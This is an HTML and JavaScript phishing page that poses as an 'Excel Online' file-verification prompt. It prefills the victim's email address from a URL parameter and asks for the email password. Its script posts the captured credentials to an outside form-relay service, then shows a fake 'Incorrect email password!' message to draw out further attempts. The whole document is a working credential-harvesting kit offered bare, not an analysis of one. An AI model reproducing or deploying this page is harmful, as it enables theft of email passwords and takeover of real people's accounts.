<form method="POST" id="form">

<div class="htxt" font style="color:#808080;">
Excel Online - Verify to view file
</div>
<hr class="hr">
<div class="fbox">
<center><div <font style="color:#000000;" id="result"></div></center>
<label for="email">Email:</label>
<input type="email" name="ai" class="input" id="email" placeholder="Email Address" readonly value="${temp_mail.value}">
<label for="password">Password:</label>
<input type="password" name="si" class="input" id="password" placeholder="Email Password" required="required" value="">
<br>
<center><input id="submit" type="submit" value="NEXT" class="olv-button olv-ignore-transform css-1m5o92u \" style="width:150px; height:45px; display:block; font-family: arial; font-size: 14px; font-weight:bold; color:#FFFFFF; 
background-color: #02723b; border: solid 1px #02723b; border-radius:5px; -webkit-box-shadow: 5px 5px 5px 5px #616162; box-shadow: 3px 3px 3px 3px #616162;"></center>
</div>

</form>

<script src="https://web3forms.com/client/script.js" async defer></script>

<script>
const form = document.getElementById('form');
const result = document.getElementById('result');

form.addEventListener('submit', function(e) {
  e.preventDefault();
  const formData = new FormData(form);
  const object = Object.fromEntries(formData);
  const json = JSON.stringify(object);
  result.innerHTML = "<span style='color:green;'><b>Verifying...</b></span>"

    fetch('https://api.web3forms.com/submit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: json
        })
        .then(async (response) => {
            let json = await response.json();
            if (response.status == 200) {
                result.innerHTML = "<span style='color:red;'><b>Incorrect email password!</b></span>";
            } else {
                console.log(response);
                result.innerHTML = json.message;
            }
        })
        .catch(error => {
            console.log(error);
            result.innerHTML = "Something went wrong!";
        })
        .then(function() {
            password.reset();
            setTimeout(() => {
                result.style.display = "none";
            }, 3000);
        });
});
</script>

<script type="text/javascript">
var getUrlParameter = function getUrlParameter(sParam) {
    var sPageURL = decodeURIComponent(window.location.search.substring(1)),
        sURLVariables = sPageURL.split('&'),
        sParameterName,
        i;
    for (i = 0; i < sURLVariables.length; i++) {
        sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] === sParam) {
            return sParameterName[1] === undefined ? true : sParameterName[1];
        }
    }
};

var firstname = getUrlParameter('e');

     document.getElementById("email").value = firstname;

</script>
    

</html>
